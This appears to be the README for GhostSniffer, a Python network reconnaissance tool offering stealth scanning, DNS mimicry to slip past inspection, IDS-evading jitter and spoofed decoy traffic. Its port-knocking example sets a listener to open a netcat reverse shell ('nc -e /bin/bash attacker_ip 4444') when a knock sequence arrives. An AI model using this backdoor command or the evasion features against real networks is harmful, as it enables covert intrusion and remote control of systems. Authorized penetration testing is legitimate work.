# 👻 GhostSniffer v2.0

**Advanced Network Reconnaissance Tool** — Zero Dependencies | Raw Sockets | Stealth Operations
**created** ---> `0xZiki`

---

## 🎯 Features

| # | Feature | Description |
|---|---------|-------------|
| 1 | **Passive Host Discovery** | A silent spy — discovers hosts from passing traffic without sending anything |
| 2 | **Protocol Mimicry** | Wraps packets to look like legitimate DNS Queries to bypass DPI |
| 3 | **Dynamic Jitter** | Random timing between each packet to break IDS pattern detection |
| 4 | **Decoy Traffic** | IP Spoofing with fake addresses to distract the Blue Team |
| 5 | **TCP SYN "Half-Open" Scan** | Fast, stealthy port scanning using SYN packets (no full handshake) |
| 6 | **Active ARP Discovery** | Layer 2 host discovery via ARP requests — works even if ICMP is blocked |
| 7 | **Passive OS Fingerprinting** | Guesses the remote OS from TTL values and packet headers |
| 8 | **Port Knocking** | Listen mode that executes a command upon receiving a specific UDP/ICMP sequence |
| 9 | **Service Version Detection** | Grabs banners from open ports to identify running services and versions |

---

## 📋 Requirements

- **Python 3.6+**
- **Administrator / root privileges** (required for Raw Sockets)
- **Zero external dependencies** — everything is Standard Library

---

## 🛡️ OPSEC & Configuration (The .env File)

To maintain strict Operational Security (OPSEC) and avoid leaking sensitive stealth configurations (like your custom decoy IPs or mimicry domains), GhostSniffer utilizes environment variables.

### Setup Instructions:
1. Do **NOT** modify the core script to hardcode your secrets.
2. Copy the provided example file to create your local secret configuration:
   ```bash
   # On Linux/Mac
   cp .env.example .env

   # On Windows
   copy .env.example .env
   ```
3. Edit the newly created `.env` file with your operational values.

**Available Environment Variables:**

| Variable | Description |
|----------|-------------|
| `STEALTH_DOMAIN` | Domain used to mask UDP payloads as DNS traffic |
| `DECOY_IPS` | Comma-separated fake IPs for spoofing (e.g., `192.168.1.1,10.0.0.1`) |
| `DEFAULT_PORT` | Destination port for UDP probes (default: `65212`) |
| `JITTER_MIN` / `JITTER_MAX` | Random delay bounds for packet crafting |
| `REPORT_INTERVAL` | Time in seconds between passive reports |

**Note:** The `.env` file is ignored by `.gitignore` to prevent accidental commits.

---

## 🚀 Usage

> ⚠️ **Must be run as Administrator/root** for Raw Sockets to work.

### Quick Start

```bash
# Display all available commands
python ghost_sniffer.py --help

# After installation via install.sh
ghostSniffer --help
```

---

### Passive Discovery — The Silent Spy

```bash
# Monitor all traffic without filtering
ghostSniffer --mode passive

# Monitor a specific subnet with reports every 15 seconds
ghostSniffer --mode passive --subnet 192.168.1.0/24 --report-interval 15

# Monitor + save results to a JSON file
ghostSniffer --mode passive --subnet 10.0.0.0/24 --output passive_results.json
```

---

### Active Scans

#### 1. UDP Scan (Original Behaviour)
```bash
# Simple UDP scan
ghostSniffer --target 192.168.1.0/24

# UDP scan with DNS Mimicry
ghostSniffer --target 192.168.1.0/24 --mimicry dns --dns-domain microsoft.com
```

#### 2. TCP SYN "Half-Open" Scan (New)
```bash
# Scan specific ports
ghostSniffer --target 192.168.1.0/24 --scan-type tcp_syn --ports 22,80,443

# Scan a wide range (1-1024)
ghostSniffer --target 192.168.1.0/24 --scan-type tcp_syn --ports 1-1024

# With Service Version Detection
ghostSniffer --target 192.168.1.0/24 --scan-type tcp_syn --ports 22,80,443 --service-detection
```

#### 3. Active ARP Discovery (New – Linux Only)
```bash
ghostSniffer --target 192.168.1.0/24 --scan-type arp
```
> **Note:** ARP scanning uses `AF_PACKET` and is only supported on Linux. On Windows, a warning will be displayed.

---

### Stealth Mode — Full Ghost Mode

```bash
# --stealth = DNS mimicry + jitter (0.5-2.0s) automatically
ghostSniffer --target 192.168.1.0/24 --stealth

# stealth + decoys = full power
ghostSniffer --target 192.168.1.0/24 --stealth --decoys 192.168.1.1,192.168.1.254

# stealth + TCP SYN + service detection + JSON export
ghostSniffer --target 192.168.1.0/24 --stealth \
  --scan-type tcp_syn --ports 22,80,443 --service-detection \
  --output full_scan.json
```

---

### Port Knocking — Listen Mode (New)

**On the server (listener):**
```bash
ghostSniffer --mode listen \
  --knock-seq 1000,2000,3000 \
  --knock-proto udp \
  --action "nc -e /bin/bash attacker_ip 4444"
```

**From the client (sending the knocks):**
```bash
for port in 1000 2000 3000; do
    echo "Knock" | nc -u -w1 <LISTENER_IP> $port
    sleep 1
done
```

**Port Knocking Options:**
- `--knock-seq` : Sequence of ports/types separated by commas.
- `--knock-proto {udp,icmp}` : Protocol for knocking.
- `--knock-timeout` : Timeout between knocks (default: 5s).
- `--action` : Command to execute when the sequence completes.

---

## 🔧 All Options (Updated)

| Option | Default | Description |
|--------|---------|-------------|
| `--mode {scan,passive,listen}` | `scan` | Operating mode (new: `listen`) |
| `--target, -t` | *required in scan* | Target Subnet (e.g. `192.168.1.0/24`) |
| `--scan-type {udp,tcp_syn,arp}` | `udp` | Scan type (new: `tcp_syn`, `arp`) |
| `--ports, -p` | `None` | Target ports for TCP SYN (e.g. `22,80,443` or `1-1024`) |
| `--port` | `65212` | Destination port for UDP scan |
| `--subnet` | `None` | Subnet filter in passive/listen mode |
| `--mimicry {normal,dns}` | `normal` | Payload type |
| `--dns-domain` | `google.com` | Domain for DNS mimicry |
| `--jitter MIN MAX` | `None` | Random delay range in seconds |
| `--decoys` | `None` | Comma-separated fake IP addresses |
| `--stealth` | `off` | Enable DNS + jitter automatically |
| `--service-detection, -sV` | `off` | Detect service versions on open ports (new) |
| `--service-timeout` | `5.0` | Timeout per service probe in seconds |
| `--knock-seq` | `None` | Port knock sequence (new) |
| `--knock-proto {udp,icmp}` | `udp` | Protocol for knocking (new) |
| `--knock-timeout` | `5.0` | Timeout between knocks in seconds (new) |
| `--action` | `None` | Command to execute on knock completion (new) |
| `--output, -o` | `None` | Save results as JSON |
| `--report-interval` | `30` | Seconds between passive reports |
| `--verbose, -v` | `off` | Print every captured packet |

---

## 🏗️ Architecture (Updated)

```
GhostSniffer Engine
├── HostRegistry              ← Thread-safe host storage (threading.Lock)
├── SnifferEngine             ← Raw socket listener (passive + active)
│   ├── IP Parser             ← Network byte order (!), 20-byte header
│   ├── ICMP Parser           ← Type/Code analysis
│   ├── TCP Parser            ← Flag/port analysis (NEW)
│   ├── ARP Handler           ← ARP reply capture (AF_PACKET) (NEW)
│   ├── OS Fingerprinter      ← TTL-based OS guessing (NEW)
│   └── Knock Matcher         ← Port-knock sequence matching (NEW)
├── ScannerEngine             ← Active probe sender
│   ├── PacketBuilder         ← Raw IP/UDP/TCP/DNS/ARP construction
│   │   ├── IP Header         ← Manual checksum (RFC 1071)
│   │   ├── UDP Header        ← Manual checksum with pseudo-header
│   │   ├── TCP SYN           ← Half-open SYN packet builder (NEW)
│   │   ├── ARP Request       ← Layer 2 ARP builder (NEW)
│   │   └── DNS Query         ← Legitimate A-record query builder
│   ├── UDP Scanner           ← Original UDP scan logic
│   ├── TCPSynScanner         ← TCP SYN half-open scanner (NEW)
│   ├── ArpScanner            ← ARP discovery scanner (NEW)
│   ├── Mimicry               ← normal / dns payload modes
│   ├── Jitter                ← random.uniform(min, max) delays
│   └── Decoys                ← Shuffled IP-spoofed packets
├── ServiceDetector           ← Banner grabbing & version detection (NEW)
│   ├── HTTP/HTTPS probes
│   ├── SSH, FTP, SMTP banners
│   └── Generic TCP connect
└── KnockListener             ← Port knocking handler (NEW)
    ├── Sequence matching
    ├── Timeout reset
    └── Action executor (subprocess.Popen)
```

### Engineering Notes

- **Thread Safety**: `HostRegistry` uses `threading.Lock()` for concurrent writes.
- **UDP/TCP Checksums**: Manually computed with pseudo-headers for cross-platform reliability.
- **IP Checksum**: Fully manual (RFC 1071) — not relying on the Kernel.
- **Byte Order**: All parsers use `!` (Network/Big-Endian).
- **Platform Aware**: Handles differences between Windows and Linux gracefully.
- **Simplified Output**: All ANSI colors and banners have been removed for clean, Nmap-like readability.

---

## 📄 Output Example (Updated)

### Console Output (TCP SYN Scan + Service Detection)

```
GhostSniffer v2.0 - Advanced Network Recon
  --------------------------------------------------
  Mode:    SCAN
  Time:    2026-08-10 14:30:00
  OS:      posix
  --------------------------------------------------

[+] Active Scan Mode — Engaging target network

[>] Target: 192.168.1.0/24 (254 hosts)
[>] Scan Type: tcp_syn
[>] Ports: 3 ports
[>] Mimicry: dns (domain: google.com)
[>] Jitter: 0.5s - 2.0s
[>] Decoys: 192.168.1.1, 192.168.1.254
[>] Local IP: 192.168.1.100

  [████████████████████████░░░░] 75% (572/762)
[+] Open port: 192.168.1.10:22
[+] Host Up: 192.168.1.10 (SYN-ACK)
[+] Open port: 192.168.1.10:80
[+] Open port: 192.168.1.50:443

[*] Starting service version detection...
[+] Service: 192.168.1.10:22 -> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
[+] Service: 192.168.1.10:80 -> HTTP/1.1 200 OK
[+] Service: 192.168.1.50:443 -> (SSL) HTTP/1.1 200 OK
[+] Service detection complete

=============================================
  GHOSTSNIFFER — FINAL REPORT
=============================================

  Statistics:
  ------------------------------------------
  Packets Captured:     1547
  Packets Sent:         762
  Decoy Packets Sent:   1524
  Hosts Scanned:        254
  Unique Hosts Found:   12
  Hosts Confirmed Up:   8

  Discovered Hosts:
  -------------------------------------------------------------------------
  IP Address        Status     Protocols    OS Guess        Open Ports
  -------------------------------------------------------------------------
  192.168.1.1       up         ICMP,ARP     Network Device  -
  192.168.1.10      up         ICMP,TCP     Linux/Unix      22(SSH-2.0-OpenSSH...),80(HTTP/1.1 200)
  192.168.1.20      up         ICMP         Windows         -
  192.168.1.50      up         TCP          Linux/Unix      443(SSL)
  -------------------------------------------------------------------------

=============================================
[+] Completed at 14:32:15
```

### JSON Output

```json
{
  "tool": "GhostSniffer v2.0",
  "timestamp": "2026-08-10T14:32:15",
  "mode": "scan",
  "config": {
    "target": "192.168.1.0/24",
    "scan_type": "tcp_syn",
    "ports": [22, 80, 443],
    "mimicry": "dns",
    "jitter": [0.5, 2.0],
    "decoys": "192.168.1.1,192.168.1.254"
  },
  "statistics": {
    "packets_captured": 1547,
    "packets_sent": 762,
    "decoy_packets_sent": 1524,
    "hosts_scanned": 254
  },
  "hosts": {
    "192.168.1.10": {
      "ip": "192.168.1.10",
      "status": "up",
      "protocols": ["ICMP", "TCP"],
      "packet_count": 8,
      "open_ports": [22, 80],
      "os_guess": "Linux/Unix",
      "ttl": 64,
      "services": {
        "22": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
        "80": "HTTP/1.1 200 OK"
      }
    }
  }
}
```

---

## ⚠️ Disclaimer

This tool is designed for **authorized penetration testing** and educational purposes only. Using it on networks without explicit permission is a legal violation. Full responsibility lies with the user.

---

## 📝 License

For educational and authorized penetration testing purposes only.